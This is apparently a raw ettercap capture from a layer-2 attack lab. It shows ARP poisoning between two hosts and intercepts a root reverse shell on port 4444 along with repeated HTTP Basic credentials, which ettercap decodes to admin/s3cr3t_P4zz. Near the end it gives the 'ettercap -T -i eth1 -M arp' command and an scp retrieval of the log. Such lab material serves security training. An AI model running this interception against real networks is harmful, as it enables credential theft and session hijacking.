  192.168.12.10:0 --> 192.168.12.20:0 |  (0)


Mon Feb  6 17:17:09 2023 [991952]
  192.168.12.20:0 --> 192.168.12.10:0 |  (0)


Mon Feb  6 17:17:10 2023 [768223]
TCP  192.168.12.10:4444 --> 192.168.12.20:44092 | AP (4)
pwd


Mon Feb  6 17:17:10 2023 [769285]
TCP  192.168.12.20:44092 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:17:10 2023 [820832]
TCP  192.168.12.10:4444 --> 192.168.12.20:44092 | A (0)


Mon Feb  6 17:17:11 2023 [77997]
TCP  192.168.12.10:47584 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:17:11 2023 [81091]
TCP  192.168.12.20:80 --> 192.168.12.10:47584 | SA (0)


Mon Feb  6 17:17:11 2023 [89037]
TCP  192.168.12.10:47584 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:11 2023 [89389]
TCP  192.168.12.10:47584 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:17:11 2023 [97081]
TCP  192.168.12.20:80 --> 192.168.12.10:47584 | A (0)


Mon Feb  6 17:17:11 2023 [99264]
TCP  192.168.12.20:80 --> 192.168.12.10:47584 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:17:11 2023 [99489]
TCP  192.168.12.20:80 --> 192.168.12.10:47584 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:17:11 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:17:11 2023 [105138]
TCP  192.168.12.10:47584 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:11 2023 [106039]
TCP  192.168.12.10:47584 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:17:11 2023 [113126]
TCP  192.168.12.20:80 --> 192.168.12.10:47584 | A (0)


Mon Feb  6 17:17:11 2023 [942573]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (4)
pwd


Mon Feb  6 17:17:11 2023 [945003]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:11 2023 [945228]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:17:11 2023 [953105]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)


Mon Feb  6 17:17:14 2023 [769305]
TCP  192.168.12.10:4444 --> 192.168.12.20:44092 | AP (3)
ls


Mon Feb  6 17:17:14 2023 [777002]
TCP  192.168.12.20:44092 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:17:15 2023 [943649]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (3)
ls


Mon Feb  6 17:17:15 2023 [945002]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:15 2023 [950204]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:17:15 2023 [953066]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)


Mon Feb  6 17:17:19 2023 [944789]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (7)
whoami


Mon Feb  6 17:17:19 2023 [954165]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:17:19 2023 [960960]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)


Mon Feb  6 17:17:21 2023 [84418]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:17:21 2023 [89145]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | SA (0)


Mon Feb  6 17:17:21 2023 [97075]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:21 2023 [107362]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (7)
whoami


Mon Feb  6 17:17:21 2023 [113067]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:21 2023 [114704]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:17:21 2023 [121135]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)


Mon Feb  6 17:17:23 2023 [117738]
TCP  192.168.12.10:47588 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:17:23 2023 [121057]
TCP  192.168.12.20:80 --> 192.168.12.10:47588 | SA (0)


Mon Feb  6 17:17:23 2023 [129031]
TCP  192.168.12.10:47588 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:23 2023 [129437]
TCP  192.168.12.10:47588 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:17:23 2023 [137107]
TCP  192.168.12.20:80 --> 192.168.12.10:47588 | A (0)


Mon Feb  6 17:17:23 2023 [139032]
TCP  192.168.12.20:80 --> 192.168.12.10:47588 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:17:23 2023 [139252]
TCP  192.168.12.20:80 --> 192.168.12.10:47588 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:17:23 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:17:23 2023 [145092]
TCP  192.168.12.10:47588 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:23 2023 [146222]
TCP  192.168.12.10:47588 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:17:23 2023 [153119]
TCP  192.168.12.20:80 --> 192.168.12.10:47588 | A (0)


Mon Feb  6 17:17:23 2023 [946091]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (4)
pwd


Mon Feb  6 17:17:23 2023 [953385]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:17:24 2023 [4806]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)


Mon Feb  6 17:17:25 2023 [109381]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (4)
pwd


Mon Feb  6 17:17:25 2023 [112997]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:25 2023 [113204]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:17:25 2023 [121031]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)


Mon Feb  6 17:17:27 2023 [947184]
TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (3)
ls


Mon Feb  6 17:17:27 2023 [952984]
TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:17:29 2023 [110385]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (3)
ls


Mon Feb  6 17:17:29 2023 [112949]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:29 2023 [114214]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:17:29 2023 [121086]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)


Mon Feb  6 17:17:33 2023 [119014]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (7)
whoami


Mon Feb  6 17:17:33 2023 [126465]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:17:33 2023 [133028]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)


Mon Feb  6 17:17:34 2023 [361575]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:17:34 2023 [365029]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | SA (0)


Mon Feb  6 17:17:34 2023 [372983]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:34 2023 [383186]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (7)
whoami


Mon Feb  6 17:17:34 2023 [393118]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:34 2023 [394556]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:17:34 2023 [401043]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)


Mon Feb  6 17:17:35 2023 [179433]
TCP  192.168.12.10:47592 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:17:35 2023 [181104]
TCP  192.168.12.20:80 --> 192.168.12.10:47592 | SA (0)


Mon Feb  6 17:17:35 2023 [188952]
TCP  192.168.12.10:47592 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:35 2023 [189317]
TCP  192.168.12.10:47592 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:17:35 2023 [197104]
TCP  192.168.12.20:80 --> 192.168.12.10:47592 | A (0)


Mon Feb  6 17:17:35 2023 [199050]
TCP  192.168.12.20:80 --> 192.168.12.10:47592 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:17:35 2023 [199294]
TCP  192.168.12.20:80 --> 192.168.12.10:47592 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:17:35 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:17:35 2023 [205072]
TCP  192.168.12.10:47592 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:35 2023 [206314]
TCP  192.168.12.10:47592 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:17:35 2023 [218665]
TCP  192.168.12.20:80 --> 192.168.12.10:47592 | A (0)


Mon Feb  6 17:17:37 2023 [120992]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (4)
pwd


Mon Feb  6 17:17:37 2023 [133796]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:17:37 2023 [184880]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)


Mon Feb  6 17:17:38 2023 [385224]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (4)
pwd


Mon Feb  6 17:17:38 2023 [399721]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:38 2023 [399959]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:17:38 2023 [405020]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)


Mon Feb  6 17:17:41 2023 [122073]
TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (3)
ls


Mon Feb  6 17:17:41 2023 [136263]
TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:17:42 2023 [386260]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (3)
ls


Mon Feb  6 17:17:42 2023 [402732]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:17:42 2023 [404020]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:17:42 2023 [426879]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)


Mon Feb  6 17:17:46 2023 [418683]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (7)
whoami


Mon Feb  6 17:17:46 2023 [458963]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:17:46 2023 [540796]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)


Mon Feb  6 17:17:47 2023 [343644]
TCP  192.168.12.10:47594 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:17:47 2023 [381082]
TCP  192.168.12.20:80 --> 192.168.12.10:47594 | SA (0)


Mon Feb  6 17:17:47 2023 [421138]
TCP  192.168.12.10:47594 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:47 2023 [421396]
TCP  192.168.12.10:47594 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:17:47 2023 [453189]
TCP  192.168.12.20:80 --> 192.168.12.10:47594 | A (0)


Mon Feb  6 17:17:47 2023 [454756]
TCP  192.168.12.20:80 --> 192.168.12.10:47594 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:17:47 2023 [454963]
TCP  192.168.12.20:80 --> 192.168.12.10:47594 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:17:47 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:17:47 2023 [493339]
TCP  192.168.12.10:47594 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:17:47 2023 [494332]
TCP  192.168.12.10:47594 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:17:47 2023 [533528]
TCP  192.168.12.20:80 --> 192.168.12.10:47594 | A (0)


Mon Feb  6 17:17:50 2023 [452253]
TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (4)
pwd


Mon Feb  6 17:17:50 2023 [532236]
TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | R (0)
Closing text interface...


Terminating ettercap...
Lua cleanup complete!
ARP poisoner deactivated.
RE-ARPing the victims...
Unified sniffing was stopped.


or 

root@eve:~# ettercap -T -i eth1 -M arp > /tmp/arp.txt
* |==================================================>| 100.00 %


┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ scp admin@10.10.148.6:/tmp/arp.txt .      
admin@10.10.148.6's password: 
arp.txt                               100%   13KB  21.9KB/s   00:00    
                                                                        
┌──(kali㉿kali)-[~/learning_l2_mac]
└─$ cat arp.txt                    

ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team

Listening on:
  eth1 -> 0E:D9:C1:ED:A6:C1
	  192.168.12.66/255.255.255.0
	  fe80::8862:1aff:fee7:9471/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
24609 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
2 hosts added to the hosts list...

ARP poisoning victims:

 GROUP 1 : ANY (all the hosts in the list)

 GROUP 2 : ANY (all the hosts in the list)
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help



Mon Feb  6 17:18:51 2023 [779619]
  192.168.12.10:0 --> 192.168.12.20:0 |  (0)


Mon Feb  6 17:18:51 2023 [779684]
  192.168.12.20:0 --> 192.168.12.10:0 |  (0)


Mon Feb  6 17:18:53 2023 [18684]
TCP  192.168.12.10:4444 --> 192.168.12.20:44126 | AP (3)
ls


Mon Feb  6 17:18:53 2023 [57916]
TCP  192.168.12.20:44126 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:18:53 2023 [58400]
TCP  192.168.12.20:44126 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:18:53 2023 [140800]
TCP  192.168.12.10:4444 --> 192.168.12.20:44126 | A (0)


Mon Feb  6 17:18:57 2023 [20237]
TCP  192.168.12.10:4444 --> 192.168.12.20:44126 | AP (7)
whoami


Mon Feb  6 17:18:57 2023 [57538]
TCP  192.168.12.20:44126 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:18:59 2023 [616161]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:18:59 2023 [635151]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | SA (0)


Mon Feb  6 17:18:59 2023 [647145]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:18:59 2023 [681825]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (7)
whoami


Mon Feb  6 17:18:59 2023 [719398]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:18:59 2023 [721525]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:18:59 2023 [747594]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | A (0)


Mon Feb  6 17:19:00 2023 [466262]
TCP  192.168.12.10:47618 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:19:00 2023 [485205]
TCP  192.168.12.20:80 --> 192.168.12.10:47618 | SA (0)


Mon Feb  6 17:19:00 2023 [497227]
TCP  192.168.12.10:47618 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:00 2023 [497388]
TCP  192.168.12.10:47618 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:19:00 2023 [509216]
TCP  192.168.12.20:80 --> 192.168.12.10:47618 | A (0)


Mon Feb  6 17:19:00 2023 [510630]
TCP  192.168.12.20:80 --> 192.168.12.10:47618 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:19:00 2023 [510878]
TCP  192.168.12.20:80 --> 192.168.12.10:47618 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:19:00 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:19:00 2023 [533472]
TCP  192.168.12.10:47618 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:00 2023 [534450]
TCP  192.168.12.10:47618 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:19:00 2023 [573680]
TCP  192.168.12.20:80 --> 192.168.12.10:47618 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:19:00 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:19:00 2023 [573744]
TCP  192.168.12.20:80 --> 192.168.12.10:47618 | A (0)


Mon Feb  6 17:19:00 2023 [585336]
TCP  192.168.12.10:47618 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:03 2023 [683794]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (4)
pwd


Mon Feb  6 17:19:03 2023 [707343]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:03 2023 [707574]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:19:03 2023 [719390]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | A (0)


Mon Feb  6 17:19:07 2023 [711817]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (3)
ls


Mon Feb  6 17:19:07 2023 [751803]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:07 2023 [752305]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:19:07 2023 [832819]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | A (0)


Mon Feb  6 17:19:11 2023 [713275]
TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (7)
whoami


Mon Feb  6 17:19:11 2023 [746933]
TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:19:12 2023 [667973]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:19:12 2023 [748419]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | SA (0)


Mon Feb  6 17:19:12 2023 [788477]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:12 2023 [911722]
TCP  192.168.12.10:47622 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:19:12 2023 [911751]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (7)
whoami


Mon Feb  6 17:19:12 2023 [950872]
TCP  192.168.12.20:80 --> 192.168.12.10:47622 | SA (0)


Mon Feb  6 17:19:12 2023 [950885]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:12 2023 [950891]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | AP (5)
root
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:19:12 2023 [990026]
TCP  192.168.12.10:47622 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:12 2023 [990038]
TCP  192.168.12.10:47622 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.


Mon Feb  6 17:19:12 2023 [990042]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | A (0)


Mon Feb  6 17:19:13 2023 [31238]
TCP  192.168.12.20:80 --> 192.168.12.10:47622 | A (0)


Mon Feb  6 17:19:13 2023 [31251]
TCP  192.168.12.20:80 --> 192.168.12.10:47622 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:19:13 2023 [31256]
TCP  192.168.12.20:80 --> 192.168.12.10:47622 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:19:13 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:19:13 2023 [67233]
TCP  192.168.12.10:47622 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:13 2023 [67246]
TCP  192.168.12.10:47622 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:19:13 2023 [107501]
TCP  192.168.12.20:80 --> 192.168.12.10:47622 | A (0)


Mon Feb  6 17:19:16 2023 [912372]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (4)
pwd


Mon Feb  6 17:19:16 2023 [926740]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:16 2023 [926975]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:19:16 2023 [942831]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | A (0)


Mon Feb  6 17:19:20 2023 [942395]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (3)
ls


Mon Feb  6 17:19:20 2023 [982344]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:20 2023 [982868]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:19:21 2023 [64892]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | A (0)


Mon Feb  6 17:19:24 2023 [943550]
TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (7)
whoami


Mon Feb  6 17:19:24 2023 [981659]
TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | R (0)


Mon Feb  6 17:19:25 2023 [261417]
TCP  192.168.12.10:47628 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:19:25 2023 [298204]
TCP  192.168.12.20:80 --> 192.168.12.10:47628 | SA (0)


Mon Feb  6 17:19:25 2023 [338297]
TCP  192.168.12.10:47628 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:25 2023 [338591]
TCP  192.168.12.10:47628 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:19:25 2023 [378507]
TCP  192.168.12.20:80 --> 192.168.12.10:47628 | A (0)


Mon Feb  6 17:19:25 2023 [380976]
TCP  192.168.12.20:80 --> 192.168.12.10:47628 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:19:25 2023 [381227]
TCP  192.168.12.20:80 --> 192.168.12.10:47628 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:19:25 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:19:25 2023 [418650]
TCP  192.168.12.10:47628 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:25 2023 [419635]
TCP  192.168.12.10:47628 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:19:25 2023 [458620]
TCP  192.168.12.20:80 --> 192.168.12.10:47628 | A (0)


Mon Feb  6 17:19:26 2023 [180402]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:19:26 2023 [195757]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | SA (0)


Mon Feb  6 17:19:26 2023 [207576]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:26 2023 [237999]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (7)
whoami


Mon Feb  6 17:19:26 2023 [271909]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:26 2023 [273509]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | AP (5)
root


Mon Feb  6 17:19:26 2023 [300135]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)


Mon Feb  6 17:19:30 2023 [239897]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (4)
pwd


Mon Feb  6 17:19:30 2023 [241004]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:30 2023 [241234]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:19:30 2023 [263329]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)


Mon Feb  6 17:19:34 2023 [266461]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (3)
ls


Mon Feb  6 17:19:34 2023 [306331]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:19:34 2023 [306815]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:19:34 2023 [466432]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)


Mon Feb  6 17:19:34 2023 [546758]
TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | FA (0)


Mon Feb  6 17:19:34 2023 [586900]
TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)


Mon Feb  6 17:19:37 2023 [662203]
TCP  192.168.12.10:47634 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:19:37 2023 [700543]
TCP  192.168.12.20:80 --> 192.168.12.10:47634 | SA (0)


Mon Feb  6 17:19:37 2023 [740561]
TCP  192.168.12.10:47634 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:19:37 2023 [740736]
TCP  192.168.12.10:47634 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:19:37 2023 [780674]
TCP  192.168.12.20:80 --> 192.168.12.10:47634 | A (0)


Mon Feb  6 17:19:37 2023 [782274]
TCP  192.168.12.20:80 --> 192.168.12.10:47634 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:19:37 2023 [782490]
TCP  192.168.12.20:80 --> 192.168.12.10:47634 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:19:37 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:19:37 2023 [820844]
